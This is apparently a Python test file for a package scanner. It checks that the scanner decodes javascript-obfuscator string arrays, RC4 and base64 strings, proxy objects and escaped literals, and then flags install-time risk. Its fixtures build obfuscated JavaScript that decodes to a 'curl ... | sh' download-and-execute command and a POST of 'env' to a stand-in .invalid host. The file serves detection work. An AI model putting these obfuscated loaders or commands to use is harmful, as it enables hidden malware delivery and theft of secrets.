"""String arrays and proxy objects read in the decoded view (0.1.8; core's
comments above _SA_MAX_CHARS and _PX_MAX_ENTRIES): javascript-obfuscator's
string array — the array function, the accessor with its offset and its
decoding (none, base64 over its own alphabet, RC4 over that base64), the
rotation its checksum loop applies — read without running anything, and
the objects of proxy functions control-flow flattening leaves read as the
calls, operations and strings they stand for, and string literals written
in hex and Unicode escapes read as their text (the detection round). Inert text
only: hosts are .invalid, nothing is executed."""
import unittest

from lazaret.scanner import core

ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="


def btoa(text):
    """javascript-obfuscator's btoa: UTF-8, then base64 over its alphabet (no padding)."""
    data = text.encode("utf-8")
    out = []
    for i in range(0, len(data), 3):
        chunk = data[i:i + 3]
        n = int.from_bytes(chunk + b"\0" * (3 - len(chunk)), "big")
        out.extend(ALPHABET[(n >> s) & 63] for s in (18, 12, 6, 0)[:len(chunk) + 1])
    return "".join(out)


def rc4(text, key):
    box, j = list(range(256)), 0
    for i in range(256):
        j = (j + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[j] = box[j], box[i]
    i = j = 0
    out = []
    for ch in text:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        out.append(chr(ord(ch) ^ box[(box[i] + box[j]) % 256]))
    return "".join(out)


def lit(s):
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n") + "'"


def esc(s):
    """`s` written with \\x escapes alone, as unicodeEscapeSequence writes it."""
    return "".join("\\x%02x" % ord(c) for c in s)


STRINGS = ["child_process", "1043528xYZ", "execSync", "curl https://x.invalid/i.sh | sh", "env", "88521ab",
           "https://x.invalid/c", "POST"]
OFF = 0x1d1


def obfuscated(stored, rot, checksum, target, calls, accessor_body="", form="A"):
    """A file as javascript-obfuscator writes it: `stored` rotated right by
    `rot` (the loop rotates it back), an accessor of form A or B, an alias,
    the checksum loop, then `calls`."""
    items = stored[-rot:] + stored[:-rot] if rot else list(stored)
    head = ("function _0xa1(){const _0xb2=[" + ",".join(lit(s) for s in items)
            + "];_0xa1=function(){return _0xb2;};return _0xa1();}")
    if form == "A":
        acc = ("function _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-" + hex(OFF) + ";const _0xf6=_0xa1();let _0x17=_0xf6[_0xd4];"
               + accessor_body + "return _0x17;}")
    else:
        acc = ("function _0xc3(_0xd4,_0xe5){const _0xf6=_0xa1();return _0xc3=function(_0x18,_0x29){_0x18=_0x18-"
               + hex(OFF) + ";let _0x17=_0xf6[_0x18];" + accessor_body + "return _0x17;},_0xc3(_0xd4,_0xe5);}")
    loop = ("(function(_0x3a,_0x4b){const _0x5c=_0xc3,_0x6d=_0x3a();while(!![]){try{const _0x7e=" + checksum
            + ";if(_0x7e===_0x4b)break;else _0x6d['push'](_0x6d['shift']());}catch(_0x8f){_0x6d['push']("
            "_0x6d['shift']());}}}(_0xa1," + target + "));")
    return head + "\n" + acc + "\n" + "const _0x90=_0xc3;\n" + loop + "\n" + calls


PLAIN = obfuscated(STRINGS, 3, "parseInt(_0x5c(0x1d2))/0x1+-parseInt(_0x5c(0x1d6))/0x3",
                   repr(1043528 - 88521 / 3),
                   "require(_0x90(0x1d1))[_0x90(0x1d3)](_0x90(0x1d4));\n")


class StringArrayTests(unittest.TestCase):
    def test_a_plain_array_rotated_by_its_checksum(self):
        view = core.decoded_view(PLAIN)
        self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh');", view)
        self.assertEqual(core.install_script_risk(PLAIN),
                         ["pipes a download into a shell" + core._DV_NOTE, core._SA_TECHNIQUE_REASON])
        self.assertEqual(view.count("\n"), PLAIN.count("\n"))            # rows kept

    def test_a_checksum_that_does_not_hold_reads_nothing(self):
        wrong = PLAIN.replace(repr(1043528 - 88521 / 3), "0x1234")
        self.assertEqual(core.decoded_view(wrong), wrong)
        self.assertEqual(core.install_script_risk(wrong), [])

    def test_the_accessor_that_replaces_itself(self):
        self.assertIn("require('child_process')", core.decoded_view(PLAIN.replace("", "")))
        text = obfuscated(STRINGS, 5, "parseInt(_0x5c(0x1d2))/0x1", "0xfec48",
                          "require(_0x90(0x1d1))[_0x90(0x1d3)](_0x90(0x1d4));\n", form="B")
        self.assertIn("execSync('curl https://x.invalid/i.sh | sh')", core.decoded_view(text))

    def test_base64_over_the_accessors_alphabet(self):
        body = "if(_0xc3['x']===undefined){var d=function(s){const a='" + ALPHABET + "';return s;};_0xc3['x']=!![];}"
        text = obfuscated([btoa(s) for s in STRINGS], 2, "parseInt(_0x5c(0x1d2))/0x1", "0xfec48",
                          "require(_0x90(0x1d1))[_0x90(0x1d3)](_0x90(0x1d4));\n", body)
        self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh')", core.decoded_view(text))

    def test_an_alphabet_written_with_escapes(self):
        # unicodeEscapeSequence writes the accessor's alphabet with \\x escapes too
        body = ("if(_0xc3['x']===undefined){var d=function(s){const a='" + esc(ALPHABET)
                + "';return s;};_0xc3['x']=!![];}")
        text = obfuscated([btoa(s) for s in STRINGS], 2, "parseInt(_0x5c(0x1d2))/0x1", "0xfec48",
                          "require(_0x90(0x1d1))[_0x90(0x1d3)](_0x90(0x1d4));\n", body)
        self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh')", core.decoded_view(text))

    def test_rc4_with_the_key_each_call_passes(self):
        body = "if(_0xc3['x']===undefined){var d=function(s){const a='" + ALPHABET + "';return s;};_0xc3['x']=!![];}"
        keys = ["(Otd", "@)JO", "a'b\\", "k(e)"]
        stored = [btoa(rc4(s, keys[i % 4])) for i, s in enumerate(STRINGS)]
        calls = ("require(_0x90(0x1d1,'(Otd'))[_0x90(0x1d3," + lit("a'b\\") + ")](_0x90(0x1d4,'k(e)'));\n"
                 "x(_0x90(0x1d8,'k(e)'), _0x90(0x1d5,'(Otd'));\n")
        text = obfuscated(stored, 4, "parseInt(_0x5c(0x1d2,'@)JO'))/0x1", "0xfec48", calls, body)
        view = core.decoded_view(text)
        self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh')", view)
        self.assertIn("x('POST', 'env')", view)

    def test_wrappers_constants_and_arithmetic(self):
        calls = ("function _0x31(_0x42,_0x53,_0x64){return _0x90(_0x64- -'0x10',_0x42);}\n"
                 "const _0x75={_0x86:0x1d1,_0x97:'0x1c3'};\n"
                 "require(_0x90(_0x75._0x86))[_0x31(0x0,0x5,_0x75._0x97)](_0x90(0x1*0x1d0+0x4));\n")
        text = obfuscated(STRINGS, 1, "parseInt(_0x5c(0x1d2))/0x1", "0xfec48", calls)
        self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh')", core.decoded_view(text))

    def test_without_a_checksum_loop_the_array_is_read_as_it_is(self):
        text = ("function _0xa1(){const _0xb2=['child_process','execSync','id'];_0xa1=function(){return _0xb2;};"
                "return _0xa1();}\nfunction _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-0x0;const _0xf6=_0xa1();return _0xf6[_0xd4];}\n"
                "require(_0xc3(0x0))[_0xc3(0x1)](_0xc3(0x2));\n")
        self.assertIn("require('child_process').execSync('id')", core.decoded_view(text))

    def test_names_that_are_not_the_accessors(self):
        # a name given something else too, a call whose index is not a constant, a string past U+FFFF
        text = PLAIN + "let _0x90b = f;\n_0x90(i);\n"
        view = core.decoded_view(text)
        self.assertIn("_0x90(i)", view)
        self.assertEqual(core._sa_to_string(12.0), "12")
        self.assertEqual(core._sa_parse_int(" -0x1fz"), -31.0)
        self.assertTrue(core._sa_parse_int("1234567890123456") != core._sa_parse_int("1234567890123456"))
        self.assertEqual(core._sa_to_number(" 0x10 "), 16.0)
        self.assertEqual(core._sa_to_number("1e3"), 1000.0)
        self.assertTrue(core._sa_to_number("0x") != core._sa_to_number("0x"))
        self.assertIsNone(core._sa_atob(btoa("\U0001F600"), ALPHABET))

    def test_a_long_obfuscated_file_in_linear_time(self):
        import time
        text = PLAIN + "y(_0x90(0x1d7));\n" * 50_000
        start = time.perf_counter()
        view = core.decoded_view(text)
        self.assertLess(time.perf_counter() - start, 20.0)
        self.assertEqual(view.count("y('https://x.invalid/c');"), 50_000)


class TechniqueTests(unittest.TestCase):
    """The detection round: code built around a string array says so,
    whatever its strings do (CRITICAL at install and at import time)."""
    TECH = core._SA_TECHNIQUE_REASON

    def test_whatever_its_strings_do(self):
        text = "'use strict';\n\n" + obfuscated(["log", "1043528xYZ", "hello", "88521ab"], 1,
                                                 "parseInt(_0x5c(0x1d2))/0x1", "0xfec48",
                                                 "console[_0x90(0x1d1)](_0x90(0x1d3));\n")
        self.assertIn("console.log('hello');", core.decoded_view(text))
        self.assertEqual(core.string_array_line(text), 3)
        self.assertEqual(core.install_script_risk(text), [self.TECH])
        reasons, line = core.import_time_risk(text, "js")
        self.assertEqual((reasons, line), ([self.TECH], 3))
        self.assertEqual(core.import_time_severity(reasons), "CRITICAL")

    def test_after_the_other_reasons(self):
        reasons, line = core.import_time_risk(PLAIN, "js")
        self.assertEqual(reasons, ["runs a downloaded script through a shell" + core._DV_NOTE, self.TECH])
        self.assertEqual(line, 5)

    def test_only_an_array_it_reads(self):
        wrong = PLAIN.replace(repr(1043528 - 88521 / 3), "0x1234")         # the checksum does not hold
        unused = ("function _0xa1(){const _0xb2=['a','b'];_0xa1=function(){return _0xb2;};return _0xa1();}\n"
                  "function _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-0x0;const _0xf6=_0xa1();return _0xf6[_0xd4];}\nf(x);\n")
        for text in (wrong, unused, "const a = ['child_process', 'exec'];\nrequire(a[0])[a[1]]('id');\n"):
            with self.subTest(text[:30]):
                self.assertIsNone(core.string_array_line(text))
                self.assertNotIn(self.TECH, core.install_script_risk(text))
                self.assertNotIn(self.TECH, core.import_time_risk(text, "js")[0])

    def test_written_with_escapes(self):
        stored = ["'" + esc(x) + "'" for x in ["child_process", "1043528xYZ", "execSync"]]
        text = ("\n\nfunction _0xa1(){const _0xb2=[" + ",".join(stored) + "];_0xa1=function(){return _0xb2;};"
                "return _0xa1();}\nfunction _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-0x0;const _0xf6=_0xa1();return _0xf6[_0xd4];}\n"
                "require(_0xc3(0x0))[_0xc3(0x2)]('x');\n")
        self.assertIn("require('child_process').execSync('x')", core.decoded_view(text))
        self.assertEqual(core.string_array_line(text), 3)


class ProxyObjectTests(unittest.TestCase):
    def test_calls_operators_and_strings(self):
        text = ("const o={'oEnxQ':function(f,a){return f(a);},'rqVFD':function(a,b){return a>=b;},"
                "'OKaPt':'child_proc'+'ess','xY':function(a,b){return a in b;}};\n"
                "o['oEnxQ'](require,o['OKaPt'])['execSync']('id');\nif(o['rqVFD'](a,b)&&o['xY']('k',m)){}\n")
        view = core.decoded_view(text)
        self.assertIn("require('child_process').execSync('id');", view)
        self.assertIn("if((a >= b)&&('k' in m)){}", view)

    def test_a_proxy_that_calls_another_and_rows_kept(self):
        text = ("const p={'A':function(f,a,b){return f(a,b);}};\n"
                "const q={'B':function(x,y,z){const g=h;return p['A'](x,y,z);},'C':p['A']};\n"
                "q['B'](fetch,\n  'https://x.invalid/c',\n  {'body':s});\nq['C'](g,1,2);\n")
        view = core.decoded_view(text)
        self.assertIn("fetch('https://x.invalid/c', {'body':s})\n\n;\n", view)
        self.assertIn("g(1, 2);", view)
        self.assertEqual(view.count("\n"), text.count("\n"))

    def test_a_name_each_function_gives_its_own_object(self):
        # an obfuscator reuses a short name in each function: a use reads the object last given before it
        text = ("function f(){const _0x5a={'a':function(g,b){return g(b);},'s':'child_'+'process'};"
                "return _0x5a['a'](require,_0x5a['s']);}\n"
                "function h(){const _0x5a={'a':function(b,c){return b+c;},'s':'execSync'};"
                "return f()[_0x5a['s']](_0x5a['a']('cu','rl'));}\n")
        view = core.decoded_view(text)
        self.assertIn("return require('child_process');}", view)
        self.assertIn("return f().execSync(('curl'));}", view)

    def test_objects_that_are_not_proxies(self):
        for text in ("const o={'a':function(x){return x+1;},'b':2};\no['a'](3);\n",
                     # the object last given before the use is no proxy; a use before any object
                     "const o={'a':function(f,a){return f(a);}};\nconst o={'a':function(x){return x+1;}};\no['a'](g,1);\n",
                     "o['a'](g,1);\nconst o={'a':function(f,a){return f(a);}};\n",
                     "const o={'a':function(f,a){return f(a);}};\no['a'](g,1,2);\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.decoded_view(text), text)


class EscapedLiteralTests(unittest.TestCase):
    """javascript-obfuscator's unicodeEscapeSequence, with or without a string array."""

    def test_names_and_commands_written_with_escapes(self):
        cmd = "".join("\\u%04x" % ord(c) for c in "curl https://x.invalid/i.sh | sh")
        text = "require('" + esc("child_process") + "')['" + esc("execSync") + "']('" + cmd + "');\n"
        self.assertEqual(core.decoded_view(text), "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n")
        self.assertEqual(core.install_script_risk(text), ["pipes a download into a shell" + core._DV_NOTE])

    def test_three_escapes_or_more(self):
        self.assertEqual(core.decoded_view("x('\\x41\\x42\\u0043', \"\\x41\\x42\\x43\");\n"), "x('ABC', \"ABC\");\n")

    def test_proxy_keys_written_with_escapes(self):
        text = ("const o={'" + esc("oEnxQ") + "':function(f,a){return f(a);}};\no['" + esc("oEnxQ")
                + "'](require,'" + esc("child_process") + "');\n")
        self.assertIn("\nrequire('child_process');\n", core.decoded_view(text))

    def test_what_is_left_as_written(self):
        for text in ("x('\\x1b\\x5b\\x33')", "x('\\x41\\u00e9\\x42')",         # not printable ASCII
                     "x('\\x41\\x27\\x42')", "x('\\x41\\x5c\\x42')", "x(\"\\x41\\x22\\x42\")",   # a quote or a backslash
                     "x('\\x20')", "x('\\x41\\x42')", "x('<\\x2fscript>')",      # a character or two
                     "x('ab\\x63\\x64\\x65')", "x('\\n\\x41\\x42\\x43')", "x('\\u{41}\\x42\\x43')",   # not wholly escapes
                     "x(b'\\x41\\x42\\x43')", "x(r'\\x41\\x42\\x43')", "x(f'\\x41\\x42\\x43')",   # raw, bytes, f-string
                     "x('\\\\x41\\x42\\x43')", "x(`\\x41\\x42\\x43`)"):   # an escaped backslash; a template
            with self.subTest(text):
                self.assertEqual(core.decoded_view(text), text)

    def test_linear_time(self):
        import time
        x = "\\x41"
        for text in ('"' * 200_000 + x, "'" + x * 200_000, ("'a" + x) * 100_000, ("'" + x + '"' + x) * 100_000,
                     "'" + ('\\"' + x) * 100_000, "b'" + ('\\x12"' + x + ' ') * 50_000 + "'",
                     ("'\\\\" + x) * 100_000, (" '" + "a" * 50 + x) * 20_000):
            start = time.perf_counter()
            core.decoded_view(text)
            self.assertLess(time.perf_counter() - start, 5.0, text[:12])


if __name__ == "__main__":
    unittest.main()
